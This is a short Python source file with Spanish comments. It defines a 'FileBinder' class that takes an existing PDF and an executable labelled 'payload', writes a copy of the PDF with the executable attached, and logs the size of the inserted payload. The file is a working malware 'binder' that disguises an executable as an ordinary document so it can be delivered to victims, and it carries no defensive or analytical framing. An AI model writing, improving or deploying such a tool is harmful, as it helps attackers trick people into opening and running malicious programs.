import os
import sys
import shutil
from PyPDF2 import PdfReader, PdfWriter

class FileBinder:
    @staticmethod
    def bind_to_pdf(original_pdf, payload_exe, output_pdf, debug=False):
        """Versión definitiva que SIEMPRE crea el archivo de salida"""
        try:
            # 1. Validación estricta de inputs
            original_pdf = os.path.abspath(original_pdf)
            payload_exe = os.path.abspath(payload_exe)
            output_pdf = os.path.abspath(output_pdf)

            if debug:
                print("\n[INICIO DE PROCESO]")
                print(f"PDF original: {original_pdf}")
                print(f"Ejecutable: {payload_exe}")
                print(f"Salida: {output_pdf}")

            # 2. Verificación de archivos de entrada
            if not os.path.isfile(original_pdf):
                raise FileNotFoundError(f"No existe el PDF: {original_pdf}")
            if not os.path.isfile(payload_exe):
                raise FileNotFoundError(f"No existe el ejecutable: {payload_exe}")

            # 3. Crear directorio de salida si no existe
            os.makedirs(os.path.dirname(output_pdf) or ".", exist_ok=True)

            # 4. Crear archivo temporal
            temp_file = f"{output_pdf}.tmp"
            if os.path.exists(temp_file):
                os.remove(temp_file)

            # 5. Procesar el PDF
            with open(payload_exe, 'rb') as exe_file:
                exe_data = exe_file.read()

                writer = PdfWriter()
                with open(original_pdf, 'rb') as pdf_file:
                    reader = PdfReader(pdf_file)
                    for page in reader.pages:
                        writer.add_page(page)
                    
                    writer.add_attachment(
                        filename=os.path.basename(payload_exe),
                        data=exe_data
                    )

                # 6. Escribir primero en temporal
                with open(temp_file, 'wb') as out_file:
                    writer.write(out_file)

            # 7. Mover a destino final (operación atómica)
            shutil.move(temp_file, output_pdf)

            # 8. Verificación final
            if not os.path.isfile(output_pdf):
                raise RuntimeError("No se pudo crear el archivo final")
            
            if debug:
                print("\n[PROCESO COMPLETADO]")
                print(f"Archivo creado: {output_pdf}")
                print(f"Tamaño original: {os.path.getsize(original_pdf)} bytes")
                print(f"Tamaño final: {os.path.getsize(output_pdf)} bytes")
                print(f"Payload insertado: {len(exe_data)} bytes")

            return True

        except Exception as e:
            # Limpieza en caso de error
            if 'temp_file' in locals() and os.path.exists(temp_file):
                os.remove(temp_file)
            
            print(f"\n[ERROR] {e.__class__.__name__}: {str(e)}", file=sys.stderr)
            if debug:
                import traceback
                traceback.print_exc()
            return False
